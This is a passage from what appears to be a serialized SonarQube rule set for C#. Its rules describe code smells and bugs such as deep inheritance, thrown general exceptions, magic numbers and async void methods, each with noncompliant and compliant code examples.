<code>LengthLimitedSingletonCollection&lt;int&gt;.instances</code> and <code>LengthLimitedSingletonCollection&lt;string&gt;.instances</code> will
point to different objects, even though <code>instances</code> is seemingly shared among all <code>LengthLimitedSingletonCollection&lt;&gt;</code>
generic classes.</p>
<p>If you need to have a static field shared among instances with different generic arguments, define a non-generic base class to store your static
members, then set your generic type to inherit from the base class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class LengthLimitedSingletonCollection&lt;T&gt; where T : new()
{
  protected const int MaxAllowedLength = 5;
  protected static Dictionary&lt;Type, object&gt; instances = new Dictionary&lt;Type, object&gt;(); // Noncompliant

  public static T GetInstance()
  {
    object instance;

    if (!instances.TryGetValue(typeof(T), out instance))
    {
      if (instances.Count &gt;= MaxAllowedLength)
      {
        throw new Exception();
      }
      instance = new T();
      instances.Add(typeof(T), instance);
    }
    return (T)instance;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class SingletonCollectionBase
{
  protected static Dictionary&lt;Type, object&gt; instances = new Dictionary&lt;Type, object&gt;();
}

public class LengthLimitedSingletonCollection&lt;T&gt; : SingletonCollectionBase where T : new()
{
  protected const int MaxAllowedLength = 5;

  public static T GetInstance()
  {
    object instance;

    if (!instances.TryGetValue(typeof(T), out instance))
    {
      if (instances.Count &gt;= MaxAllowedLength)
      {
        throw new Exception();
      }
      instance = new T();
      instances.Add(typeof(T), instance);
    }
    return (T)instance;
  }
}
</pre>
<h2>Exceptions</h2>
<p>If the static field or property uses a type parameter, then the developer is assumed to understand that the static member is not shared among the
closed constructed types.</p>
<pre>
public class Cache&lt;T&gt;
{
   private static Dictionary&lt;string, T&gt; CacheDictionary { get; set; } // Compliant
}
</pre>Z
CODE_SMELL
´
csharpsquid:S110ñ
csharpsquidS1102Inheritance tree of classes should not be too deep"MAJOR*cs:µ<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming. It's a way to compartmentalize and reuse code by
creating collections of attributes and behaviors called classes which can be based on previously created classes. But abusing this concept by creating
a deep inheritance tree can lead to very complex and unmaintainable source code. Most of the time a too deep inheritance tree is due to bad object
oriented design which has led to systematically use 'inheritance' when for instance 'composition' would suit better.</p>
<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code> has a greater depth than is allowed. </p>Z
CODE_SMELL
…
csharpsquid:S4005≥
csharpsquidS40058"System.Uri" arguments should be used instead of strings"MAJOR*cs:À<p>String representations of URIs or URLs are prone to parsing and encoding errors which can lead to vulnerabilities. The <code>System.Uri</code>
class is a safe alternative and should be preferred.</p>
<p>This rule raises an issue when a called method has a string parameter with a name containing "uri", "Uri", "urn", "Urn", "url" or "Url" and the
declaring type contains a corresponding overload that takes a <code>System.Uri</code> as a parameter.</p>
<p>When there is a choice between two overloads that differ only regarding the representation of a URI, the user should choose the overload that takes
a <code>System.Uri</code> argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
   public class Foo
   {
      public void FetchResource(string uriString) { }
      public void FetchResource(Uri uri) { }

      public string ReadResource(string uriString, string name, bool isLocal) { }
      public string ReadResource(Uri uri, string name, bool isLocal) { }

      public void Main() {
        FetchResource("http://www.mysite.com"); // Noncompliant
        ReadResource("http://www.mysite.com", "foo-resource", true); // Noncompliant
      }
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
   public class Foo
   {
      public void FetchResource(string uriString) { }
      public void FetchResource(Uri uri) { }

      public string ReadResource(string uriString, string name, bool isLocal) { }
      public string ReadResource(Uri uri, string name, bool isLocal) { }

      public void Main() {
        FetchResource(new Uri("http://www.mysite.com"));
        ReadResource(new Uri("http://www.mysite.com"), "foo-resource", true);
      }
   }
}
</pre>Z
CODE_SMELL
Á
csharpsquid:S4004—
csharpsquidS4004(Collection properties should be readonly"MAJOR*cs:˘
<p>A writable collection property can be replaced by a completely different collection. Making it <code>readonly</code> prevents that while still
allowing individual members to be set. If you want to allow the replacement of the whole collection the recommended pattern is to implement a method
to remove all the elements (e.g. <code>System.Collections.List&lt;T&gt;.Clear</code>) and a method to populate the collection (e.g.
<code>System.Collections.List&lt;T&gt;.AddRange</code>).</p>
<p>This rule raises an issue when an externally visible writable property is of a type that implements <code>System.Collections.ICollection</code> or
<code>System.Collections.Generic.ICollection&lt;T&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Collections;

namespace MyLibrary
{
  public class Foo
  {
    List&lt;string&gt; strings;

    public List&lt;string&gt; SomeStrings
    {
      get { return strings; }
      set { strings = value; } // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Collections;

namespace MyLibrary
{
  public class Foo
  {
    List&lt;string&gt; strings;

    public readonly List&lt;string&gt; SomeStrings
    {
      get { return strings; }
    }
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise issues for <code>string</code>, <code>Array</code> and <code>PermissionSet</code>.</p>Z
CODE_SMELL
ñ	
csharpsquid:S112Å	
csharpsquidS112)General exceptions should never be thrown"MAJOR*cs:©<p>Throwing such general exceptions as <code>Exception</code>, <code>SystemException</code>, <code>ApplicationException</code>,
<code>IndexOutOfRangeException</code>, <code>NullReferenceException</code>, <code>OutOfMemoryException</code> and
<code>ExecutionEngineException</code> prevents calling methods from handling true, system-generated exceptions differently than application-generated
errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void DoSomething(object obj)
{
  if (obj == null)
  {
    throw new NullReferenceException("obj");  // Noncompliant
  }
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void DoSomething(object obj)
{
  if (obj == null)
  {
    throw new ArgumentNullException("obj");
  }
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/397.html">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BoB3AQ">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>Z
CODE_SMELL
Œ
csharpsquid:S4002∏
csharpsquidS4002*Disposable types should declare finalizers"MAJOR*cs:ﬁ<p>This rule raises an issue when a disposable type contains fields of the following types and does not implement a finalizer:</p>
<ul>
  <li> <code>System.IntPtr</code> </li>
  <li> <code>System.UIntPtr</code> </li>
  <li> <code>System.Runtime.InteropService.HandleRef</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Runtime.InteropServices;

namespace MyLibrary
{
  public class Foo : IDisposable // Noncompliant: Doesn't have a finalizer
  {
    private IntPtr myResource;
    private bool disposed = false;

    protected virtual void Dispose(bool disposing)
    {
      if (!disposed)
      {
        // Dispose of resources held by this instance.
        FreeResource(myResource);
        disposed = true;

        // Suppress finalization of this disposed instance.
        if (disposing)
        {
          GC.SuppressFinalize(this);
        }
      }
    }

    public void Dispose() {
      Dispose(true);
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Runtime.InteropServices;

namespace MyLibrary
{
  public class Foo : IDisposable
  {
    private IntPtr myResource;
    private bool disposed = false;

    protected virtual void Dispose(bool disposing)
    {
      if (!disposed)
      {
        // Dispose of resources held by this instance.
        FreeResource(myResource);
        disposed = true;

        // Suppress finalization of this disposed instance.
        if (disposing)
        {
          GC.SuppressFinalize(this);
        }
      }
    }

    ~Foo()
    {
      Dispose(false);
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> Related: <a href='/coding_rules#rule_key=csharpsquid%3AS3881'>S3881</a> - "IDisposable" should be implemented correctly </li>
</ul>Z
CODE_SMELL
≈
csharpsquid:S1656Ø
csharpsquidS1656%Variables should not be self-assigned"MAJOR*cs:·<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void SetName(string name)
{
  name = name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void SetName(string name)
{
  this.name = name;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
—
csharpsquid:S3956ª
csharpsquidS3956:"Generic.List" instances should not be part of public APIs"MAJOR*cs:—<p><code>System.Collections.Generic.List&lt;T&gt;</code> is a generic collection that is designed for performance and not inheritance. For example, it
does not contain virtual members that make it easier to change the behavior of an inherited class. That means that future attempts to expand the
behavior will be spoiled because the extension points simply aren't there. Instead, one of the following generic collections should be used:</p>
<ul>
  <li> <code>System.Collections.Generic.IEnumerable&lt;T&gt;</code> </li>
  <li> <code>System.Collections.Generic.IReadOnlyCollection&lt;T&gt;</code> </li>
  <li> <code>System.Collections.Generic.ICollection&lt;TKey&gt;</code> </li>
  <li> <code>System.Collections.Generic.IReadOnlyList&lt;T&gt;</code> </li>
  <li> <code>System.Collections.Generic.IList&lt;TKey&gt;</code> </li>
  <li> <code>System.Collections.ObjectModel.Collection&lt;T&gt;</code> </li>
  <li> <code>System.Collections.ObjectModel.ReadOnlyCollection&lt;T&gt;</code> </li>
  <li> <code>System.Collections.ObjectModel.KeyedCollection&lt;TKey, Titem&gt;</code> </li>
</ul>
<p>This rule raises an issue every time a <code>System.Collections.Generic.List&lt;T&gt;</code> is exposed:</p>
<ul>
  <li> As an externally visible member. </li>
  <li> As the return type of an externally visible method. </li>
  <li> As a parameter type of an an externally visible method. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
namespace Foo
{
   public class Bar
   {
      public List&lt;T&gt; Method1(T arg) // Noncompliant
      {
           //...
      }
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace Foo
{
   public class Bar
   {
      public Collection&lt;T&gt; Method1(T arg)
      {
           //...
      }
   }
}
</pre>Z
CODE_SMELL
˛
csharpsquid:S907È
csharpsquidS907#"goto" statement should not be used"MAJOR*cs:ó<p><code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable. Structured control flow statements such
as <code>if</code>, <code>for</code>, <code>while</code>, <code>continue</code> or <code>break</code> should be used instead.</p>Z
CODE_SMELL
”
csharpsquid:S103æ
csharpsquidS103Lines should not be too long"MAJOR*cs:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
È
csharpsquid:S104‘
csharpsquidS104,Files should not have too many lines of code"MAJOR*cs:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
ó

csharpsquid:S106Ç

csharpsquidS106<Standard outputs should not be used directly to log anything"MAJOR*cs:ó	<p>When logging a message there are several important requirements which must be fulfilled:</p>
<ul>
  <li> The user must be able to easily retrieve the logs </li>
  <li> The format of all logged message must be uniform to allow the user to easily read the log </li>
  <li> Logged data must actually be recorded </li>
  <li> Sensitive data must only be logged securely </li>
</ul>
<p>If a program directly writes to the standard outputs, there is absolutely no way to comply with those requirements. That's why defining and using a
dedicated logger is highly recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
    // ...
    Console.WriteLine("so far, so good..."); // Noncompliant
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored by this rule:</p>
<ul>
  <li> Console Applications </li>
  <li> Calls in methods decorated with <code>[Conditional ("DEBUG")]</code> </li>
  <li> Calls included in DEBUG preprocessor branches (<code>#if DEBUG</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/RoElAQ">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>Z
CODE_SMELL
»
csharpsquid:S107≥
csharpsquidS107+Methods should not have too many parameters"MAJOR*cs:Ÿ<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, string param4, long param5)
{
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, string param4)
{
...
}
</pre>Z
CODE_SMELL
À	
csharpsquid:S109∂	
csharpsquidS109 Magic numbers should not be used"MAJOR*cs:Á<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loop, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void DoSomething()
{
    for(int i = 0; i &lt; 4; i++)  // Noncompliant, 4 is a magic number
    {
        ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private const int NUMBER_OF_CYCLES = 4;

public static void DoSomething()
{
    for(int i = 0; i &lt; NUMBER_OF_CYCLES ; i++)  //Compliant
    {
        ...
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the magic number is used as part of the <code>GetHashCode</code> method or a variable/field declaration.</p>Z
CODE_SMELL
Ë
csharpsquid:S108”
csharpsquidS108.Nested blocks of code should not be left empty"MAJOR*cs:ˆ<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>Z
CODE_SMELL
¡
csharpsquid:S2995´
csharpsquidS2995;"Object.ReferenceEquals" should not be used for value types"MAJOR*cs:«<p>Using <code>Object.ReferenceEquals</code> to compare the references of two value types simply won't return the expected results most of the time
because such types are passed by value, not by reference.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  private MyStruct myStruct;

  public void DoSomething(MyStruct s1) {
    int a = 1;
    int b = 1;

    if (Object.ReferenceEquals(myStruct, s1))  // Noncompliant; this can never be true
    {
      // ...
    }
    else if (Object.ReferenceEquals(a,b)) // Noncompliant
    {
      // ...
    }
  }
}
</pre>ZBUG
ò
csharpsquid:S2996Ç
csharpsquidS2996/"ThreadStatic" fields should not be initialized"MAJOR*cs:™<p>When an object has a field annotated with <code>ThreadStatic</code>, that field is shared within a given thread, but unique across threads. Since a
class' static initializer is only invoked for the first thread created, it also means that only the first thread will have the expected initial
values.</p>
<p>Instead, allow such fields to be initialized to their default values or make the initialization lazy.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  [ThreadStatic]
  public static object PerThreadObject = new object(); // Noncompliant. Will be null in all the threads except the first one.
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  [ThreadStatic]
  public static object _perThreadObject;
  public static object PerThreadObject
  {
    get
    {
      if (_perThreadObject == null)
      {
        _perThreadObject = new object();
      }
      return _perThreadObject;
    }
  }
}
</pre>ZBUG
ç
csharpsquid:S3169˜
csharpsquidS3169+Multiple "OrderBy" calls should not be used"MAJOR*cs:ú<p>There's no point in chaining multiple <code>OrderBy</code> calls in a LINQ; only the last one will be reflected in the result because each
subsequent call completely reorders the list. Thus, calling <code>OrderBy</code> multiple times is a performance issue as well, because all of the
sorting will be executed, but only the result of the last sort will be kept.</p>
<p>Instead, use <code>ThenBy</code> for each call after the first. </p>
<h2>Noncompliant Code Example</h2>
<pre>
var x = personList
  .OrderBy(person =&gt; person.Age)
  .OrderBy(person =&gt; person.Name)  // Noncompliant
  .ToList();  // x is sorted by Name, not sub-sorted
</pre>
<h2>Compliant Solution</h2>
<pre>
var x = personList
  .OrderBy(person =&gt; person.Age)
  .ThenBy(person =&gt; person.Name)
  .ToList();
</pre>Z
CODE_SMELL
≈
csharpsquid:S4016Ø
csharpsquidS40162Enumeration members should not be named "Reserved""MAJOR*cs:Õ<p>If an <code>enum</code> member's name contains the word "reserved" it implies it is not currently used and will be change in the future. However
changing an <code>enum</code> member is a breaking change and can create significant problems. There is no need to reserve an <code>enum</code> member
since a new member can be added in the future, and such an addition will usually not be a breaking change.</p>
<p>This rule raises an issue when the name of an enumeration member contains "reserved".</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public enum Color
  {
        None,
        Red,
        Orange,
        Yellow,
        ReservedColor  // Noncompliant
    }
}
</pre>Z
CODE_SMELL
Ã
csharpsquid:S4017∂
csharpsquidS40179Method signatures should not contain nested generic types"MAJOR*cs:Õ<p>A nested type is a type argument that is also a generic type. Calling a method with such a nested type argument requires complicated and confusing
code. It should be avoided as much as possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Collections.Generic;

namespace MyLibrary
{
  public class Foo
  {
    public void DoSomething(ICollection&lt;ICollection&lt;int&gt;&gt; outerCollect) // Noncompliant
    {
    }
  }
}
</pre>Z
CODE_SMELL
≈
csharpsquid:S3168Ø
csharpsquidS3168("async" methods should not return "void""MAJOR*cs:ﬁ<p>An <code>async</code> method with a <code>void</code> return type is a "fire and forget" method best reserved for event handlers because there's no
way to wait for the method's execution to complete and respond accordingly. There's also no way to <code>catch</code> exceptions thrown from the
method.</p>
<p>Having an <code>async void</code> method that is not an event handler could mean your program works some times and not others because of timing
issues. Instead, <code>async</code> methods should return <code>Task</code>.</p>
<p>This rule raises an issue when non-event handler methods are both <code>async</code> and <code>void</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class HttpPrinter
{
  private string content;

  public async void CallNetwork(string url) //Noncompliant
  {
    var client = new HttpClient();
    var response = await client.GetAsync(url);
    content = await response.Content.ReadAsStringAsync();
  }

  public async Task PrintContent(string url)  // works correctly if web request finishes in under 1 second, otherwise content will be null
  {
    CallNetwork(url);
    await Task.Delay(1000);
    Console.Write(content);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class HttpPrinter
{
  private string content;

  public async Task CallNetwork(string url)
  {
    var client = new HttpClient();
    var response = await client.GetAsync(url);
    content = await response.Content.ReadAsStringAsync();
  }

  public async Task PrintContent(string url)
  {
    await CallNetwork(url); // &lt;----- call changed here. If await is not added warning CS4014 will be triggered
    await Task.Delay(1000);
    Console.Write(content);
  }
}
</pre>
<h2>Exceptions</h2>
<p>Event handlers, i.e. methods with two arguments, first one matching <code>object sender</code> and the second being or inheriting from
<code>EventArgs</code>, are ignored.</p>ZBUG
ê
csharpsquid:S122˚
csharpsquidS122&Statements should be on separate lines"MAJOR*cs:¶<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) DoSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition)
{
  DoSomething();
}
</pre>
<h2>Exceptions</h2>
<p>Anonymous functions containing a single statement are ignored. Block statements are not considered either.</p>
<pre>
Func&lt;object, bool&gt; item1 = o =&gt; { return true; }; // Compliant
Func&lt;object, bool&gt; item1 = o =&gt; { var r = false; return r; }; // Noncompliant
</pre>Z
CODE_SMELL
î
csharpsquid:S2757˛
csharpsquidS2757'"=+" should not be used instead of "+=""MAJOR*cs:Æ<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int target = -5;
int num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what's meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
int target = -5;
int num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>ZBUG
Â
csharpsquid:S2758œ
csharpsquidS2758QThe ternary operator should not return the same value regardless of the condition"MAJOR*cs:’<p>When the second and third operands of a ternary operator are the same, the operator will always return the same value regardless of the condition.
Either the operator itself is pointless, or a mistake was made in coding it. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public bool CanVote(Person person)
{
  return person.GetAge() &gt; 18 ? true : true; // Noncompliant; is this what was intended?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public bool CanVote(Person person)
{
  return person.GetAge() &gt; 18 ? true : false;
  // or even better:
  // return person.GetAge() &gt; 18;
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS3923'>S3923</a> instead.</p>ZBUG
Â
csharpsquid:S2997œ
csharpsquidS2997D"IDisposables" created in a "using" statement should not be returned"MAJOR*cs:‚<p>Typically you want to use <code>using</code> to create a local <code>IDisposable</code> variable; it will trigger disposal of the object when
control passes out of the block's scope. The exception to this rule is when your method returns that <code>IDisposable</code>. In that case
<code>using</code> disposes of the object before the caller can make use of it, likely causing exceptions at runtime. So you should either remove
<code>using</code> or avoid returning the <code>IDisposable</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public FileStream WriteToFile(string path, string text)
{
  using (var fs = File.Create(path)) // Noncompliant
  {
    var bytes = Encoding.UTF8.GetBytes(text);
    fs.Write(bytes, 0, bytes.Length);
    return fs;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public FileStream WriteToFile(string path, string text)
{
  var fs = File.Create(path);
  var bytes = Encoding.UTF8.GetBytes(text);
  fs.Write(bytes, 0, bytes.Length);
  return fs;
}
</pre>ZBUG
”
csharpsquid:S3603Ω
csharpsquidS36033Methods with "Pure" attribute should return a value"MAJOR*cs:·<p>Marking a method with the <code>Pure</code> attribute specifies that the method doesn't make any visible changes; thus, the method should return a
result, otherwise the call to the method should be equal to no-operation. So <code>Pure</code> on a <code>void</code> method is either a mistake, or
the method doesn't do any meaningful task.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Person
{
  private int age;
  [Pure] // Noncompliant. In this case the method makes a possibly visible state change
  void ConfigureAge(int age)
  {
    ...
    this.age = age;
  }
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Person
{
  private int age;

  void ConfigureAge(int age)
  {
    ...
    this.age = age;
  }
  ...
}
</pre>ZBUG
£
csharpsquid:S1751ç
csharpsquidS17515Loops with at most one iteration should be refactored"MAJOR*cs:Ø<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. If the
initial intention of the author was really to conditionally execute one piece of code, an <code>if</code> statement should be used instead. If that
was not the initial intention of the author, the body of the loop should be fixed to use the nested <code>return</code>, <code>break</code> or
<code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++)
{
    Console.WriteLine(i);
    break;  // Noncompliant, loop only executes once
}
...
foreach (var item in items)
{
    return item;  // Noncompliant, loop only executes once
}
...
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++)
{
    Console.WriteLine(i);
}
...
var item = items.FirstOrDefault();
if (item != null)
{
    return item;
}
...
</pre>ZBUG
Ñ
csharpsquid:S1871Ó
csharpsquidS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*cs:Á<p>Having two <code>cases</code> in the same <code>switch</code> statement or branches in the same <code>if</code> structure with the same
implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an
<code>if</code> structure they should be combined, or for a <code>switch</code>, one should fall through to the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i)
{
  case 1:
    DoFirst();
    DoSomething();
    break;
  case 2:
    DoSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    DoFirst();
    DoSomething();
    break;
  default:
    DoTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10)
{
  DoFirst();
  DoTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20)
{
  DoTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50)   // Noncompliant; duplicates first condition
{
  DoFirst();
  DoTheThing();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if (a &gt;= 0 &amp;&amp; a &lt; 10)
{
  DoTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20)
{
  DoTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50)    //no issue, usually this is done on purpose to increase the readability
{
  DoTheThing();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=csharpsquid%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1)
{
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
}
else if (a == 2)
{
  doSomething();
}
</pre>Z
CODE_SMELL
ö
csharpsquid:S3010Ñ
csharpsquidS30103Static fields should not be updated in constructors"MAJOR*cs:°<p>Assigning a value to a <code>static</code> field in a constructor could cause unreliable behavior at runtime since it will change the value for all
instances of the class.</p>
<p>Instead remove the field's <code>static</code> modifier, or initialize it statically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person
{
  private static DateTime dateOfBirth;
  private static int expectedFingers;

  public Person(DateTime birthday)
  {
    dateOfBirth = birthday;  // Noncompliant; now everyone has this birthday
    expectedFingers = 10;  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person
{
  private DateTime dateOfBirth;
  private static int expectedFingers = 10;

  public Person(DateTime birthday)
  {
    this.dateOfBirth = birthday;
  }
}
</pre>Z
CODE_SMELL
®
csharpsquid:S4581í
csharpsquidS4581"new Guid()" should not be used"MAJOR*cs:√<p>When the syntax <code>new Guid()</code> (i.e. parameterless instantiation) is used, it must be that one of three things is wanted:</p>
<ol>
  <li> An empty GUID, in which case <code>Guid.Empty</code> is clearer. </li>
  <li> A randomly-generated GUID, in which case <code>Guid.NewGuid()</code> should be used. </li>
  <li> A new GUID with a specific initialization, in which case the initialization parameter is missing. </li>
</ol>
<p>This rule raises an issue when a parameterless instantiation of the <code>Guid</code> struct is found.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void Foo()
{
    var g = new Guid(); // Noncompliant - what's the intent?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Foo(byte[] bytes)
{
    var g1 = Guid.Empty;
    var g2 = Guid.NewGuid();
    var g3 = new Guid(bytes);
}
</pre>Z
CODE_SMELL
Õ	
csharpsquid:S4220∑	
csharpsquidS4220#Events should have proper arguments"MAJOR*cs:‰<p>When raising an event, two arguments are expected by the <code>EventHandler</code> delegate: Sender and event-data. There are three guidelines
regarding these parameters:</p>
<ul>
  <li> Do not pass <code>null</code> as the sender when raising a non-static event. </li>
  <li> Do pass <code>null</code> as the sender when raising a static event. </li>
  <li> Do not pass <code>null</code> as the event-data. If no data should be passed, then <code>EventArgs.Empty</code> should be used. </li>
</ul>
<p>This rule raises an issue when any of these guidelines is not met.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  class Foo
  {
    public event EventHandler ThresholdReached;

    protected virtual void OnThresholdReached(EventArgs e)
    {
        ThresholdReached?.Invoke(null, e); // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  class Foo
  {
    public event EventHandler ThresholdReached;

    protected virtual void OnThresholdReached(EventArgs e)
    {
        ThresholdReached?.Invoke(this, e);
    }
  }
}
</pre>Z
CODE_SMELL
ñ
csharpsquid:S1764Ä
csharpsquidS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*cs:å
<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) // always true
{
  doZ();
}
if ( a != a ) // always false
{
  doY();
}
if ( a == b &amp;&amp; a == b ) // if the first one is true, the second one is too
{
  doX();
}
if ( a == b || a == b ) // if the first one is true, the second one is too
{
  doW();
}

int j = 5 / 5; //always 1
int k = 5 - 5; // always 0

c.Equals(c);    //always true
Object.Equals(c, c); //always true
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, <code>=</code>, <code>&lt;&lt;</code>, and <code>&gt;&gt;</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=csharpsquid%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
Ú
csharpsquid:S2971‹
csharpsquidS2971("IEnumerable" LINQs should be simplified"MAJOR*cs:Ñ<p>In the interests of readability, code that can be simplified should be simplified. To that end, there are several ways <code>IEnumerable</code>
language integrated queries (LINQ) can be simplified</p>
<ul>
  <li> Use <code>OfType</code> instead of using <code>Select</code> with <code>as</code> to type cast elements and then null-checking in a query
  expression to choose elements based on type. </li>
  <li> Use <code>OfType</code> instead of using <code>Where</code> and the <code>is</code> operator, followed by a cast in a <code>Select</code> </li>
  <li> Use an expression in <code>Any</code> instead of <code>Where(element =&gt; [expression]).Any()</code>. </li>
  <li> Use <code>Count</code> instead of <code>Count()</code> when it's available. </li>
